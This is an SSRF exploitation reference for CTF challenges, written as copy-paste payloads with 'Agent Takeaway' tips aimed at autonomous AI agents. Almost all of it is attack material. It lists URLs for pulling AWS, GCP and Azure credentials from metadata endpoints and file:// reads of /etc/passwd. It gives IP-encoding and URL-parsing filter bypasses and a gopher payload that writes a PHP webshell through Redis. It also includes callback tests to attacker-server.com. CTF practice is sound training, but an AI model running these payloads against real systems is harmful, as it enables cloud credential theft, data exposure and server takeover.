# SSRF (Server-Side Request Forgery) - CTF Exploitation Reference

> **Document Purpose:** Actionable SSRF techniques for CTF challenges. Designed for autonomous agent retrieval with copy-paste payloads, bypass techniques, and internal service exploitation.

---

## 1. QUICK REFERENCE: SSRF Detection

> **When to use this section:** Application makes HTTP requests based on user input.

### 1.1 SSRF Detection Indicators

**Tags:** `ssrf, detection, indicators, vulnerable-parameters`

**Common Vulnerable Parameters:**
```
?url=
?uri=
?path=
?src=
?dest=
?redirect=
?link=
?target=
?site=
?html=
?feed=
?domain=
?host=
?proxy=
?callback=
?api=
```

**Vulnerable Functionality:**
- URL fetching/preview
- PDF generators
- Image loaders (from URL)
- Webhook/callback features
- Import from URL
- Link preview/unfurl
- Proxy features
- File download from URL

**Detection Test:**
```
?url=http://attacker-server.com/ssrf-test
```
Check attacker server logs for incoming request.

**Agent Takeaway:**
- Look for any feature that fetches URLs
- Use Burp Collaborator, webhook.site, or own server
- Test every URL-related parameter

---

### 1.2 Basic SSRF Payloads

**Tags:** `ssrf, basic, payloads, internal-access`

**Access Internal Services:**
```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://127.1/
http://127.0.0.1:80/
http://127.0.0.1:8080/
http://127.0.0.1:443/
http://127.0.0.1:22/
```

**Cloud Metadata Endpoints:**
```
http://169.254.169.254/              # AWS/GCP/Azure
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/computeMetadata/v1/  # GCP
http://100.100.100.200/              # Alibaba
```

**Internal Network Scanning:**
```
http://192.168.0.1/
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/
```

**Agent Takeaway:**
- Start with `127.0.0.1` to access localhost services
- Cloud instances: check `169.254.169.254` for metadata
- Scan internal network ranges

---

## 2. COMMON SSRF TARGETS

> **When to use this section:** You have SSRF and want to exploit internal services.

### 2.1 Cloud Metadata Services

**Tags:** `ssrf, cloud, metadata, aws, gcp, azure`

**AWS EC2 Metadata (IMDSv1):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
http://169.254.169.254/latest/user-data/
```

**AWS Get Credentials:**
```
1. http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → Returns role name
2. http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
   → Returns AccessKeyId, SecretAccessKey, Token
```

**Google Cloud (GCP):**
```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```
Requires header: `Metadata-Flavor: Google`

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```
Requires header: `Metadata: true`

**Agent Takeaway:**
- AWS IMDSv1 has no authentication - easy target
- Credentials in metadata can lead to cloud takeover
- Check for CTF flags in user-data

---

### 2.2 Internal Web Services

**Tags:** `ssrf, internal, web-services, localhost`

**Common Internal Ports:**
```
http://127.0.0.1:80/       # HTTP
http://127.0.0.1:8080/     # Alternative HTTP
http://127.0.0.1:8000/     # Python/Django
http://127.0.0.1:3000/     # Node.js
http://127.0.0.1:5000/     # Flask
http://127.0.0.1:4000/     # Various
http://127.0.0.1:9000/     # PHP-FPM
http://127.0.0.1:6379/     # Redis
http://127.0.0.1:11211/    # Memcached
http://127.0.0.1:27017/    # MongoDB
http://127.0.0.1:3306/     # MySQL
http://127.0.0.1:5432/     # PostgreSQL
http://127.0.0.1:22/       # SSH
```

**Admin Panels:**
```
http://127.0.0.1/admin
http://127.0.0.1/admin/
http://127.0.0.1/manager/
http://127.0.0.1/console/
http://localhost/flag
http://localhost/flag.txt
```

**Agent Takeaway:**
- Many services only accessible from localhost
- Admin panels often restricted to internal access
- Scan common ports to find services

---

### 2.3 Protocol Handlers

**Tags:** `ssrf, protocols, gopher, file, dict`

**File Protocol:**
```
file:///etc/passwd
file:///flag.txt
file:///var/www/html/config.php
```

**Gopher Protocol (Advanced):**
```
gopher://127.0.0.1:6379/_INFO          # Redis
gopher://127.0.0.1:11211/_stats        # Memcached
gopher://127.0.0.1:25/_MAIL FROM:...   # SMTP
```

**Dict Protocol:**
```
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:11211/stats
```

**Agent Takeaway:**
- `file://` reads local files (often blocked)
- `gopher://` can interact with various protocols
- Not all applications support all protocols

---

## 3. SSRF FILTER BYPASS

> **When to use this section:** Basic SSRF payloads are blocked.

### 3.1 IP Address Bypass

**Tags:** `ssrf, bypass, ip, localhost, filter`

**Localhost Alternatives:**
```
http://127.0.0.1/
http://127.1/
http://127.0.1/
http://0.0.0.0/
http://0/
http://localhost/
http://LOCALHOST/
http://localHOST/
http://[::1]/                  # IPv6 localhost
http://[0:0:0:0:0:0:0:1]/      # IPv6 full
http://[::ffff:127.0.0.1]/    # IPv6 mapped
```

**Decimal IP:**
```
http://2130706433/            # 127.0.0.1 as decimal
http://017700000001/          # 127.0.0.1 as octal
http://0x7f000001/            # 127.0.0.1 as hex
```

**Conversion Formula:**
```
127.0.0.1 = 127*256³ + 0*256² + 0*256¹ + 1 = 2130706433
```

**Mixed Encoding:**
```
http://127.0.0.0x01/
http://0177.0.0.1/
http://0x7f.0.0.1/
```

**Agent Takeaway:**
- Many ways to represent 127.0.0.1
- Decimal, hex, octal, and IPv6 often bypass filters
- `http://127.1/` is short and often works

---

### 3.2 URL Bypass Techniques

**Tags:** `ssrf, bypass, url, redirect, dns`

**URL Encoding:**
```
http://127.0.0.1/ → http://%31%32%37%2e%30%2e%30%2e%31/
http://localhost/ → http://%6c%6f%63%61%6c%68%6f%73%74/
```

**Double URL Encoding:**
```
http://127.0.0.1/ → http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/
```

**DNS Rebinding:**
```
http://spoofed.burpcollaborator.net/  # Points to 127.0.0.1
http://localtest.me/                   # Resolves to 127.0.0.1
http://127.0.0.1.nip.io/              # Wildcard DNS
http://127-0-0-1.nip.io/
```

**Redirect Bypass:**
```
1. Host redirect at http://attacker.com/redirect
2. Redirect to http://127.0.0.1/internal
3. Server follows redirect to internal resource
```

**Open Redirect Chains:**
```
?url=http://allowed-site.com/redirect?to=http://127.0.0.1/
```

**Agent Takeaway:**
- DNS services like `nip.io` and `localtest.me` resolve to any IP
- Redirect bypasses "allowlist" checks that only check initial URL
- Try various encodings

---

### 3.3 Bypass with URL Parsing Tricks

**Tags:** `ssrf, bypass, url-parsing, credentials, fragment`

**Credentials in URL:**
```
http://expected.com@127.0.0.1/
http://127.0.0.1#@expected.com/
http://expected.com:80@127.0.0.1/
```

**Fragment Confusion:**
```
http://127.0.0.1#.expected.com
http://127.0.0.1?.expected.com
```

**Parser Differentials:**
```
http://expected.com\@127.0.0.1/
http://127.0.0.1\.expected.com/
http://127.0.0.1%00.expected.com/
```

**Subdomain Tricks:**
```
http://127.0.0.1.attacker.com/    # Attacker controls this domain
http://expected.com.127.0.0.1.nip.io/
```

**Agent Takeaway:**
- URL parsing differs between validators and requesters
- `@` in URL can trick parsers about host
- Null bytes may truncate domain checks

---

### 3.4 SSRF Bypass Decision Tree

**Tags:** `ssrf, bypass, decision-tree, workflow`

```
START: Basic SSRF blocked

TEST 1: What's filtered?
├── 127.0.0.1 blocked → Try alternatives
├── localhost blocked → Try IP variations
├── Private IPs blocked → Try DNS rebinding
└── Domain allowlist → Try redirect bypass

STEP 2: IP bypass
├── Try: 127.1
├── Try: 0.0.0.0
├── Try: [::1]
├── Try: 2130706433 (decimal)
└── Try: 0x7f000001 (hex)

STEP 3: DNS bypass
├── Try: 127.0.0.1.nip.io
├── Try: localtest.me
└── Try: Your domain resolving to target

STEP 4: URL parsing tricks
├── Try: http://expected.com@127.0.0.1/
├── Try: http://127.0.0.1#@expected.com
└── Try: URL encoding

STEP 5: Redirect bypass
├── Host redirect on your server
└── Find open redirect on allowed domain
```

---

## 4. SSRF TO RCE

> **When to use this section:** Escalating SSRF to command execution.

### 4.1 Redis Exploitation via SSRF

**Tags:** `ssrf, redis, rce, exploitation`

**Detect Redis (Gopher):**
```
gopher://127.0.0.1:6379/_INFO
```

**Write Webshell via Redis:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$8%0d%0awebshell%0d%0a$28%0d%0a<?php system($_GET['c']); ?>%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
```

**Agent Takeaway:**
- Redis often accessible on localhost:6379
- Can write files to webroot
- Gopher protocol required for complex commands

---

### 4.2 Internal Admin Panels

**Tags:** `ssrf, admin, internal, bypass`

**Access Restricted Admin:**
```
http://127.0.0.1/admin
http://127.0.0.1/admin/delete?user=admin
http://127.0.0.1/api/internal/flag
```

**Agent Takeaway:**
- Admin panels often only check source IP
- SSRF bypasses IP-based restrictions
- Perform actions as "internal" user

---

## 5. CTF-SPECIFIC SSRF STRATEGIES

> **When to use this section:** Solving SSRF challenges in CTF.

### 5.1 SSRF CTF Playbook

**Tags:** `ssrf, ctf, playbook, workflow`

**Step 1: Identify SSRF Point**
```
Look for: URL parameters, URL fetch features, webhooks
Test: http://attacker-server.com/test
```

**Step 2: Test Localhost Access**
```
http://127.0.0.1/
http://127.0.0.1/flag
http://127.0.0.1/flag.txt
http://127.0.0.1/admin
```

**Step 3: If Filtered, Bypass**
```
http://127.1/
http://[::1]/
http://2130706433/
http://127.0.0.1.nip.io/
```

**Step 4: Check Cloud Metadata**
```
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
```

**Step 5: Scan Internal Ports**
```
http://127.0.0.1:80/
http://127.0.0.1:8080/
http://127.0.0.1:3000/
http://127.0.0.1:6379/
```

**Agent Takeaway:**
- Test localhost first for quick wins
- Check cloud metadata (common in cloud CTFs)
- Use bypass techniques if blocked

---

## 6. SUMMARY: SSRF Quick Reference

**Basic SSRF:**
```
http://127.0.0.1/
http://localhost/admin
```

**Localhost Bypass:**
```
http://127.1/
http://[::1]/
http://2130706433/
http://0x7f000001/
```

**DNS Bypass:**
```
http://127.0.0.1.nip.io/
http://localtest.me/
```

**Cloud Metadata (AWS):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
```

**Credential in URL:**
```
http://allowed.com@127.0.0.1/
```

**Flag Locations:**
```
http://127.0.0.1/flag
http://127.0.0.1/flag.txt
http://169.254.169.254/latest/user-data/
http://127.0.0.1/admin/flag
```
